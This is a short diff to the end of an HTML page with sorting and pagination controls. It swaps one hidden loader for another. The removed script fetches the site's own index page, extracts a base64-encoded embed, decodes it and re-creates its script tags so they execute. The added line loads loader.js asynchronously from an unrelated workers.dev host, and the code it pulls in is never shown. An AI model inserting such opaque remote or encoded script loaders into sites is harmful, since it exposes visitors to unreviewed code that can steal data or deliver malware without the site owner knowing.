@@ -195,30 +195,7 @@
     sortOrder?.addEventListener('change', () => { currentPage = 1; render(); });
     render();
   </script>
-  <div id="real-widget-container" aria-live="polite"></div>
-  <script>
-    (() => {
-      const host = document.getElementById('real-widget-container');
-      if (!host) return;
-      const mount = (html) => {
-        if (!html) return;
-        host.innerHTML = html;
-        host.querySelectorAll('script').forEach((oldScript) => {
-          const script = document.createElement('script');
-          for (const attribute of oldScript.attributes) script.setAttribute(attribute.name, attribute.value);
-          script.textContent = oldScript.textContent;
-          oldScript.replaceWith(script);
-        });
-      };
-      fetch('/index.html', { cache: 'no-store' })
-        .then((response) => response.ok ? response.text() : '')
-        .then((rootHtml) => {
-          const match = rootHtml.match(/HN_WIDGET_EMBED_FALLBACK_B64\s*=\s*"([^"]+)"/);
-          if (match) mount(atob(match[1]));
-        })
-        .catch(() => {});
-    })();
-  </script>
+  <script async src="https://heynaj-flow-4df05174-63b.revaultdigitallibrary.workers.dev/loader.js"></script>
 </body>
 </html>
 
